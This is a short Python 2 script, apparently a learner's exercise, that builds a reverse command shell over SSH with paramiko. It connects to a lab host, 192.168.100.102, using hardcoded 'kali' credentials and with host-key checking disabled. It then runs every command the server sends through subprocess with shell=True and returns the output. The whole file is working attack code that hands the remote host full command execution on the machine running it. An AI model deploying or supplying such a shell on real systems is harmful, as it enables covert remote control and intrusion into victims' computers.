import paramiko
import subprocess

def ssh_command(ip, user, password, command):
    client = paramiko.SSHClient()
    #client.load_host_keys('/home/evega/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=password)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command) # why not exec_command? what's the difference?
        print ssh_session.recv(1024) # read banner
        while True:
            command = ssh_session.recv(1024) # get the command from the SSH server
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception, e:
                ssh_session.send(str(e))
        client.close()
    return


ssh_command("192.168.100.102", "kali", "kali", "ClientConnected")
# The first command being sent is 'Client Connected'